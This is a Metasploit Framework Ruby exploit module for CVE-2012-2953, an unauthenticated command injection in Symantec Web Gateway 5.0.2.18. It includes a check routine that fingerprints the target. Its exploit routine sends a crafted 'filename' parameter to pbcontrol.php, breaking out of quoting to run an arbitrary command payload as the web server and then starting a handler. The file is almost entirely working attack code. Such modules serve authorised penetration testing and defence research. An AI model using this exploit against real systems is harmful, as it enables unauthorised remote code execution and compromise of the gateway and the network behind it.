##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => "Symantec Web Gateway 5.0.2.18 pbcontrol.php Command Injection",
            'Description'    => %q{
                    This module exploits a command injection vulnerability found in Symantec Web
                Gateway's HTTP service.  While handling the filename parameter, the Spywall API
                does not do any filtering before passing it to an exec() call in proxy_file(),
                thus results in remote code execution under the context of the web server. Please
                note authentication is NOT needed to gain access.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'muts',  # Original discovery
                    'sinn3r' # Metasploit
                ],
            'References'     =>
                [
                    [ 'CVE', '2012-2953' ],
                    [ 'BID', '54426' ],
                    [ 'EDB', '20088' ],
                    [ 'URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00']
                ],
            'Payload'        =>
                {
                    #'BadChars' => "\x00\x0d\x0a",
                    'Compat'      =>
                        {
                            'PayloadType' => 'cmd',
                            'RequiredCmd' => 'generic perl bash telnet'
                        }
                },
            'Platform'       => ['unix'],
            'Arch'           => ARCH_CMD,
            'Targets'        =>
                [
                    ['Symantec Web Gateway 5.0.2.18', {}]
                ],
            'Privileged'     => false,
            'DisclosureDate' => "Jul 23 2012",
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptString.new('TARGETURI', [true, 'The URI path to pbcontrol', '/spywall/pbcontrol.php'])
            ], self.class)
    end
 
 
    def check
        dir = File.dirname(target_uri.path)
 
        res1 = send_request_raw({'uri' => "#{dir}/login.php"})
        res2 = send_request_raw({'uri' => "#{dir}/pbcontrol.php"})
 
        if res1 and res2
            if res1.body =~ /\<title\>Symantec Web Gateway\<\/title\>/ and res2.body =~ /^0$/
                return Exploit::CheckCode::Detected
            end
        end
 
        return Exploit::CheckCode::Safe
    end
 
 
    def exploit
        send_request_cgi({
            'uri'      => target_uri.path,
            'method'   => 'GET',
            'vars_get' => {
                'filename' => "#{Rex::Text.rand_text_alpha(4)}\";#{payload.encoded};\"",
                'stage' => '0'
            }
        })
 
        handler
    end
 
end

